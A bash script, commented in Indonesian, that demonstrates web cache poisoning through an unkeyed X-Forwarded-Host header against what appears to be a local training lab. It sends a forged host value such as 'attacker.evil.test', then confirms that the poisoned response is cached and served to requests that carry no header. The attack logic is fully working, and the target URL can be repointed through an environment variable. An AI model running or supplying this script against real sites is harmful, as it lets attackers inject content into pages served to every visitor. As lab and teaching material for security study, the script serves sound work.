#!/usr/bin/env bash
# demo.sh — Demo injeksi cache poisoning lewat header, bukti di `curl -I`.
#
# Jalankan lab dulu di terminal lain:
#     python3 lab_cache_origin.py 8899
#
# Lalu:
#     ./demo.sh                        # pakai default
#     ./demo.sh "evil.test"            # payload kustom
#     ./demo.sh "attacker.com" /artikel/123
#
# Yang ditunjukkan, urut:
#   1. curl -I sebelum inject        -> X-Cache: MISS
#   2. inject payload pakai GET      -> X-Cache: MISS (response inilah yang disimpan)
#   3. curl -I tanpa header (korban) -> X-Cache: HIT + Content-Length berubah
#   4. verifikasi payload beneran ada di body

set -u

HOST="${1:-attacker.evil.test}"
PATH_ARTIKEL="${2:-/article/demo-$(date +%s)}"
BASE="${LAB_URL:-http://127.0.0.1:8899}"
URL="${BASE}${PATH_ARTIKEL}"

# warna, kalau terminal mendukung
B=$'\033[1m'; R=$'\033[31m'; G=$'\033[32m'; Y=$'\033[33m'; C=$'\033[36m'; N=$'\033[0m'

line() { printf '%s\n' "--------------------------------------------------------------"; }
step() { printf '\n%s%s %s%s\n' "$B$C" "$1" "$2" "$N"; }

# URL harus absolut; kalau user cuma kasih path, tempel ke BASE
case "$URL" in
  http://*|https://*) : ;;
  *) URL="${BASE}${URL}" ;;
esac

printf '%s' "$B"
cat <<'BANNER'
==============================================================
  DEMO — Web Cache Poisoning via Unkeyed Header
  Bukti akhir: `curl -I` menunjukkan X-Cache: HIT
==============================================================
BANNER
printf '%s' "$N"

# ---------- reset lab kalau endpoint-nya ada ----------
curl -s "${BASE}/_cache/clear" >/dev/null 2>&1 || true
curl -s "${BASE}/_events/clear" >/dev/null 2>&1 || true

printf '\nTarget : %s\nPayload: %s\n' "$URL" "$HOST"

# ---------- 1) kondisi bersih ----------
step "1/" "curl -I sebelum injeksi (kondisi bersih)"
line
BEFORE=$(curl -sI "$URL")
printf '%s\n' "$BEFORE" | grep -iE '^(HTTP/|content-length|x-cache|x-cache-hits|age)'
CL_BEFORE=$(printf '%s\n' "$BEFORE" | awk 'BEGIN{IGNORECASE=1} /^content-length:/{gsub(/\r/,"");print $2}')

# ---------- 2) injeksi ----------
step "2/" "INJECT: kirim ${HOST} di header X-Forwarded-Host"
printf '%s       curl -s -H %sX-Forwarded-Host: %s%s%s %s%s\n' "$Y" "'" "$HOST" "'" "$N" "'" "$URL'"
line
INJECT=$(curl -s -H "X-Forwarded-Host: $HOST" -D- -o /dev/null "$URL")
printf '%s\n' "$INJECT" | grep -iE '^(HTTP/|content-length|x-cache|x-cache-hits|age)'
CL_INJECT=$(printf '%s\n' "$INJECT" | awk 'BEGIN{IGNORECASE=1} /^content-length:/{gsub(/\r/,"");print $2}')

# ---------- 3) korban ----------
step "3/" "curl -I TANPA header — ini yang dilihat korban"
printf '%s       curl -I %s%s\n' "$Y" "$URL" "$N"
line
AFTER=$(curl -sI "$URL")
printf '%s\n' "$AFTER" | grep -iE '^(HTTP/|content-length|x-cache|x-cache-hits|age)'

CACHE_STATE=$(printf '%s\n' "$AFTER" | awk 'BEGIN{IGNORECASE=1} /^x-cache:/{gsub(/\r/,"");print toupper($2)}')
CL_AFTER=$(printf '%s\n' "$AFTER" | awk 'BEGIN{IGNORECASE=1} /^content-length:/{gsub(/\r/,"");print $2}')

# ---------- 4) bukti payload di body ----------
step "4/" "Verifikasi payload benar-benar tersaji ke korban"
line
BODY=$(curl -s "$URL")
if printf '%s' "$BODY" | grep -qF "$HOST"; then
  printf '%s    payload DITEMUKAN di body response korban%s\n' "$G$B" "$N"
  printf '    contoh: %s\n' "$(printf '%s' "$BODY" | grep -oE "[^\"']*${HOST}[^\"']*" | head -1)"
  FOUND=1
else
  printf '%s    payload TIDAK ditemukan di body%s\n' "$R$B" "$N"
  FOUND=0
fi

# ---------- kesimpulan ----------
printf '\n'
line
if [ "$CACHE_STATE" = "HIT" ] && [ "$FOUND" = "1" ]; then
  printf '%s  HASIL: CACHE BERHASIL DIRACUN%s\n' "$R$B" "$N"
  line
  printf '  X-Cache          : %sMISS%s (bersih) -> %sHIT%s (teracuni)\n' "$Y" "$N" "$R$B" "$N"
  printf '  Content-Length   : %s -> %s\n' "${CL_BEFORE:-?}" "${CL_AFTER:-?}"
  printf '  Payload tersaji  : ya, ke request tanpa header apa pun\n'
  [ -n "${CL_INJECT:-}" ] && [ "${CL_INJECT}" != "${CL_BEFORE:-}" ] && \
    printf '  Catatan          : ukuran body berubah saat inject, membuktikan\n                     response yang di-cache adalah versi teracuni.\n'
  printf '\n  Artinya: siapa pun yang membuka URL ini sekarang menerima\n  halaman yang sudah diubah, tanpa perlu mengirim header apa pun.\n'
  printf '  Efek bertahan sampai TTL cache habis.\n'
  EXIT=0
else
  printf '%s  BELUM BERHASIL%s\n' "$Y$B" "$N"
  line
  printf '  X-Cache akhir: %s | payload di body: %s\n' "${CACHE_STATE:-?}" "$FOUND"
  printf '  Cek: apakah target punya cache layer? Apakah URL-nya benar?\n'
  printf '  Kalau cache sudah terisi dari percobaan sebelumnya, jalankan\n'
  printf '  curl -s %s/_cache/clear dulu.\n' "$BASE"
  EXIT=1
fi
line

exit "${EXIT:-1}"